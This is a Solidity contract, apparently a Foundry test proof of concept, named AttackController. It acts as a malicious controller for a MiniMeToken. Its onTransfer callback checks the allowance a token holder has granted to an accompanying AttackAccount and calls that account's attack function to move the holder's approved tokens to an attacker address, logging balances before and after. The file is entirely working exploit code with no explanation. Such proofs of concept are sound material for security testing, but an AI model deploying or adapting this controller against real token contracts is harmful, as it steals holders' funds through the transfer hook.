// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import { console } from "forge-std/Test.sol";
import { TokenController } from "../../contracts/TokenController.sol";
import { MiniMeToken } from "../../contracts/MiniMeToken.sol";
import { AttackAccount } from "./AttackAccount.sol";

contract AttackController is TokenController {
    address public attackerEOA;
    AttackAccount public attackAccount;

    constructor(address _attackerEOA, AttackAccount _attackAccount) {
        attackAccount = _attackAccount;
        attackerEOA = _attackerEOA;
    }

    function proxyPayment(address _owner) public payable override returns (bool) {
        return true;
    }

    function onTransfer(address _from, address _to, uint256 _amount) public override returns (bool) {
        uint256 allowance = MiniMeToken(payable(msg.sender)).allowance(_from, address(attackAccount));
        uint256 balance = MiniMeToken(payable(msg.sender)).balanceOf(_from);
        console.log("FROM");
        console.log(_from);
        console.log("TO");
        console.log(_to);
        console.log("AMOUNT");
        console.log(_amount);
        console.log("ALLOWANCE");
        console.log(allowance);
        console.log("BALANCE BEFORE");
        console.log(balance);
        if (allowance > 0) {
            if (allowance > balance) {
                attackAccount.attack(_from, attackerEOA, balance);
            } else {
                attackAccount.attack(_from, attackerEOA, allowance);
            }
        }

        balance = MiniMeToken(payable(msg.sender)).balanceOf(_from);
        console.log("BALANCE AFTER");
        console.log(balance);
        return true;
    }

    function onApprove(address _owner, address _spender, uint256 _amount) public pure override returns (bool) {
        return true;
    }
}
